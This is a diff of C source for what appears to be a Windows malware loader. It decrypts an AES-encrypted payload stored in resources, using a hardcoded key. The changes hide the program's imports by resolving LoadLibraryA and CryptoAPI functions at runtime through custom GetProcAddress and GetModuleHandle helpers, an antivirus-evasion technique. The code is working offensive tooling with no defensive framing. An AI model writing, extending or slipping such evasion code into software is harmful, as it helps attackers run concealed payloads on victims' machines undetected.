@@ -5,11 +5,19 @@
 
 #include <windows.h>
 #include <tlhelp32.h>
+#include <wincrypt.h>
+#pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "advapi32")
 #include "resources.h"
 #include "helpers.h"
 
 char key[] = "mysecretkeee";
+
+// TODO: Change this somehow
+// Load crypto module, does not get loaded when none of the functions are being statically resolved
+typedef HMODULE (WINAPI * LoadLibrary_t)(LPCSTR lpFileName);
+LoadLibrary_t p_LoadLibraryA = (LoadLibrary_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "LoadLibraryA");
+HMODULE hCryptModule = p_LoadLibraryA("ADVAPI32.DLL");
 
 // Resolved functions
 typedef HRSRC (WINAPI * FindResource_t)(HMODULE hModule, LPCSTR lpName, LPCSTR lpType);
@@ -66,7 +74,6 @@ int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keyl
     CryptDestroyHash_t pCryptDestroyHash = (CryptDestroyHash_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptDestroyHash");
     CryptDestroyKey_t pCryptDestroyKey = (CryptDestroyKey_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptDestroyKey");
 
-
     if (!pCryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
         return -1;
     }
@@ -84,9 +91,9 @@ int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keyl
         return -1;
     }
     
-    CryptReleaseContext(hProv, 0);
-    CryptDestroyHash(hHash);
-    CryptDestroyKey(hKey);
+    pCryptReleaseContext(hProv, 0);
+    pCryptDestroyHash(hHash);
+    pCryptDestroyKey(hKey);
     
     return 0;
 }
